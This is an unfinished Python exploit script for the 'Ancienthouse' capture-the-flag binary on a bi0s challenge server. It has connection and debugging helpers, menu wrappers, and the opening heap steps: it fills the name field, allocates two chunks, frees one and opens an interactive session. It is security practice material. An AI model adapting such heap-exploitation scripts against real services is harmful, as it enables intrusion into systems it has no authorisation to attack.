#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./Ancienthouse')

host = args.HOST or 'pwn.challenge.bi0s.in'
port = int(args.PORT or 1230)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --


def re(timeout=10):
    from __main__ import io
    return io.recv(timeout=timeout)

def ren(a=0, timeout=10):
    from __main__ import io
    return io.recvn(a, timeout=timeout)

def reu(a):
    from __main__ import io
    return io.recvuntil(a)

def rl(timeout=10):
    from __main__ import io
    return io.recvline(timeout=timeout)

def s(a):
    from __main__ import io
    return io.send(a)

def sl(a):
    from __main__ import io
    return io.sendline(a)

def sla(a, b):
    from __main__ import io
    return io.sendlineafter(a, b)

def sa(a, b):
    from __main__ import io
    return io.sendafter(a, b)

def uu64(a):
    from __main__ import io
    return u64(a.ljust(8,b"\x00"))

def option(ch):
    sla(">> ", str(ch))

def set_name(name):
    sa("Who dares to enter these hallowed halls!! : ", name)

def add(size, data):
    option(1)
    sla("Enter the size : ", str(size))
    sla("Enter name : ", data)

def show(idx):
    option(2)
    sla("Enter enemy id : ", str(idx))
    reu("Starting battle with ")
    leak = reu(" ....").replace(b" ....", b"")
    return leak

def delete(idx, free=True):
    while True:
        show(str(idx))
        reu("[*] Health remaining : ")
        health = int(ren(2))
        if health >= 10 :
            show(str(idx))
        else:
            if free:
                sla(">>", "1")
            else:
                sla(">>", "2")
            break

def merge(idx1, idx2):
    option(3)
    sla("[+] Enemy id 1: ", str(idx1))
    sla("[+] Enemy id 2: ", str(idx2))


io = start()
set_name(p64(0x100)*8)
add(0x40, "A"*0x40)
add(0x10, "B"*0x10)
# delete(0)
delete(1)
io.interactive()

